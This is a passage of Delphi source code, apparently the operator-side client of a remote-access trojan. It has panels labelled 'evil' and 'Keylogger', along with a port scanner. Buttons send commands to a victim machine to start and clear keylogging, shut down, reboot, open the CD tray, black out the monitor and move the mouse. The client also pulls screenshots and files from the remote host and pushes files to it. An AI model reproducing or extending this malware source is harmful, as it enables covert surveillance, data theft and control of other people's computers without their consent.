   if commandname = 'c_msg' then begin
   memo3.lines.add('He Said :');
   memo3.lines.add('  '+strippeddata);
   end;
   end;

   procedure TForm1.FormCreate(Sender: TObject);
   begin

   bevel3.Width := form1.Width;
   bevel3.height := form1.height;
    pabout.Visible := false;
    pchat.Visible := false;
    pevil.Visible := false;
    pmessage.Visible := false;

    pnews.Visible := false;
    pportscan.Visible := false;
    pproc.Visible := false;
    psearch.Visible := false;
    psystem.Visible := false;
    psystemfun.Visible := false;
    pKeylogger.Visible := false;
   end;

   procedure TForm1.Button22Click(Sender: TObject);
   begin
   if cs.Active = true then
   cs.Socket.SendText('EXITF');
   end;

   procedure TForm1.Button23Click(Sender: TObject);
   begin
   if cs.Active = true then
   cs.Socket.SendText('LOGOF');
   end;

   procedure TForm1.Button24Click(Sender: TObject);
   begin
   if cs.Active = true then
   cs.Socket.SendText('EBOOT');
   end;

   procedure TForm1.Button25Click(Sender: TObject);
   begin
   if cs.Active = true then
   cs.Socket.SendText('SDOWN');
   end;

   procedure TForm1.Button26Click(Sender: TObject);
   begin
   if cs.Active = true then
   cs.Socket.SendText('POWAH');
   end;

   procedure TForm1.Button31Click(Sender: TObject);
   begin
   if cs.Active = true then
   cs.Socket.SendText('CDROM');
   end;

   procedure TForm1.Button27Click(Sender: TObject);
   begin
   if cs.Active = true then
   cs.Socket.SendText('SWITC');
   end;

   procedure TForm1.Button28Click(Sender: TObject);
   begin
   if cs.Active = true then
   cs.Socket.SendText('MONITON');
   end;

   procedure TForm1.Button29Click(Sender: TObject);
   begin
   if cs.Active = true then
   cs.Socket.SendText('MONITOFF');
   end;

   procedure TForm1.Button30Click(Sender: TObject);
   begin
   if cs.Active = true then
   cs.Socket.SendText('BLACK');
   end;

   procedure TForm1.BoxFilesMouseUp(Sender: TObject; Button: TMouseButton;
     Shift: TShiftState; X, Y: Integer);
   var i:integer;
   begin

   for i:=0 to BoxFiles.Items.Count -1 do begin

   if BOXfiles.Selected[i] = true then
    edit12.Text := BOXfiles.Items[i];

   end;

   end;

   procedure TForm1.SpeedButton2Click(Sender: TObject);
   begin
   cs.active := false;
   stats('Idle ...');
   end;

   procedure TForm1.Label7Click(Sender: TObject);
   begin
   application.Terminate;
   end;

   procedure TForm1.Label15Click(Sender: TObject);
   begin
   shellexecute(handle,'open','http://wwsicmaggot.cjb.net',nil,nil,0);
   end;

   procedure TForm1.SSClientError(Sender: TObject; Socket: TCustomWinSocket;
     ErrorEvent: TErrorEvent; var ErrorCode: Integer);
   begin
   errorcode := 0;
   end;

   procedure TForm1.SSClientRead(Sender: TObject; Socket: TCustomWinSocket);
   var Buffer: array [0..9999] of Char;
       IncommingLen, RecievedLen: integer;
       Filepath: string;
   begin
      IncommingLen := socket.ReceiveLength;
      // If the size of any incomming data is the size of 0 then the process begins
       Filepath := edit3.text + form2.label6.caption;
       if filepath = '' then filepath := extractfilepath(application.ExeName)+form2.label6.caption;
       // Sets a String Filepath for the actual directory with the filename so that the shellexecute can run this after
       while IncommingLen > 0 do
       // Must make sure the process ends

       begin
          RecievedLen := socket.ReceiveBuf(Buffer, Sizeof(Buffer));
          // Changes the size of RecievedLen by the amount of incoming data recieved
       if RecievedLen <= 0 then
       // Small part of the code where once the buffer reaches 0 the code will exit
          Break
       else
       IncommingStream.Write(Buffer, RecievedLen);
       // Writes the Incoming data into a new stream by the filename and size which is recieved
   //    ProgressBar1.StepBy(RecievedLen);

   // NU ska vi grejja :D:D:D:D:D:D

   form2.FlatGauge2.Progress := form2.FlatGauge2.Progress + RecievedLen;
   form2.FlatGauge3.Progress := form2.FlatGauge3.Progress - RecievedLen;

   // NU har vi grejjat :D:D:D:D:D:D

       // through the primary socket Also this line increases the progess indicator bar
       if IncommingStream.Size >= form2.flatgauge2.Maxvalue then
       // Onces the stream size begins to reach the size which was sent before sending the file then this
       begin
        // procedure will start
          IncommingStream.Free;
           // Free's the stream
          cs.Socket.SendText('DONE!');
          // From here it starts setting the variables back
   form2.FlatGauge3.Progress := 0;
   form2.FlatGauge2.Progress := 0;
   //       if Messagedlg('Would you Like to open the recieved file?', mtConfirmation, [MbYes,MbNo],0) = MrYes then   // Simply asks the user if he wants to open the file if yes will execute if no break
   form2.hide;                                                                      // This line basically executes any file using the extension from the windows ini files.
   if form2.label6.caption = 'screen.bmp' then begin
   sleep(200);
    screenv.Image1.Picture.LoadFromFile(filepath);
   end
   else
    showmessage('Transfer Done');
          Break;
       end;
       end;
   end;

   procedure TForm1.Button32Click(Sender: TObject);
   begin
   if cs.Active = true then begin
    if edit12.text <> '' then cs.socket.sendtext('SEA_U'+edit12.text);
   end;
   end;

   procedure TForm1.Button33Click(Sender: TObject);
   var jesus:string;
   begin
   if flatedit1.text <> '' then begin
    if fileexists(flatedit1.text) then begin
      if cs.Active = True then
         begin
            Streamsize := TFileStream.Create(extractfilename(flatedit1.text), fmopenread); // Stream created just to Calculate size
            jesus := inttostr(streamsize.Size);
            Sleep(500);
            cs.Socket.SendText('FILEN'+extractfilename(flatedit1.text)); // Sends filesize through primary socket
            Sleep(500);
            cs.Socket.SendText('FILES'+jesus); // Sends filesize through primary socket
            Streamsize.Position := 0;
            Streamsize.Free;
            sleep(100);
            cs2.Address := cs.Address;
            cs2.Port := cs.Port + 2;
            cs2.Open; // ready to send file on second socket
            if cs2.Socket.SendStream(TFileStream.Create(extractfilename(flatedit1.text), fmopenRead)) then exit;
         // above creates a stream and sends as a stream its in a if line because this is the only way it will automatically check the byte order and send the whole stream
      end;
     end
     else
     stats('File Dont exist');
   end;
   end;

   procedure TForm1.CS2Error(Sender: TObject; Socket: TCustomWinSocket;
     ErrorEvent: TErrorEvent; var ErrorCode: Integer);
   begin
   errorcode :=0;
   end;

   procedure TForm1.Button35Click(Sender: TObject);
   begin
   if cs.Active = true then begin
    cs.socket.sendtext('KEYLO');
   end;
   end;

   procedure TForm1.Button34Click(Sender: TObject);
   begin
   if cs.Active = true then begin
    cs.socket.sendtext('KEYCL');
   end;
   end;

   procedure TForm1.SpeedButton15Click(Sender: TObject);
   begin
    if cs.Active = true then begin
     cs.Socket.SendText('Mos_x'+x_pos.text);
     sleep(400);
     cs.Socket.SendText('Mos_y'+y_pos.text);
    end;
   end;

   procedure TForm1.SpeedButton16Click(Sender: TObject);
   begin
     if cs.Active = true then
      cs.socket.SendText('chatt');
   end;
   function GetLocalT: String;
   var
      stSystemTime : TSystemTime;
   begin
      Windows.GetLocalTime( stSystemTime );
      Result := DateTimeToStr( SystemTimeToDateTime( stSystemTime ) );
   end;

   procedure TForm1.Timer1Timer(Sender: TObject);
   begin
   Label51.Caption:= 'Local Current Time : '+GetLocalT;
   end;

   end.
